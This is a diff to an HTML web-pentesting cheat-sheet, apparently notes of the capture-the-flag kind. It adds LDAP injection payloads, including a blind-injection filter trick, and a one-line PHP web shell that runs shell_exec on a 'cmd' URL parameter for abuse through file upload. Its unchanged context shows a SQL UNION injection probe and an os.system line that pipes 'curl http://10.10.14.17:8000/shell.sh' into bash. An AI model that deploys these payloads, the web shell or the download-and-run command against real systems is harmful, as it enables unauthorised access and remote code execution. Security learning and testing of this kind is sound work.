@@ -99,7 +99,18 @@
                     no error would mean that this parameter is injectable   
                     <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
                 
-                    </ul> 
+                    </ul>
+                    
+                    <h2 id="LDAP injection">LDAP injection</h2>
+                    <ul>
+                    <p>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input.</p>
+                    <p>In case you found a place where you can test your injection there are several methods</p>
+                    <pre><code class="language-powershell">*                    #Shows all registers
+a*                   #Shows all register that start with a
+aa*                  #Sometimes helps to show more registers. Remember to check for all letters
+USER)(description=a* #Check if the first letter of description field starts with a. Useful for blind LDAP injection. It may fail if the char "*" is present
+</code></pre>
+                    </ul>
                         <h2 id="XSS: Cross Site Scripting">XSS: Cross Site Scripting</h2>
                         <ul>
                             <p>Remember to try all diferent inputs to detect XSS</p>
@@ -226,6 +237,11 @@ os.system("curl http://10.10.14.17:8000/shell.sh | bash")
 &lt;/xsl:stylesheet&gt;
                             </code></pre>
 
+                            <h2 id = "File Upload" >File Upload</h2>
+                            <p>In case you found a method of file upload which can be exploited. (Normally by know where are located the uploaded files and which is it's name)</p>
+                            <pre><code class="language-php">&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"?&gt;</code></pre>
+
+                            
 
 
                         </ul>
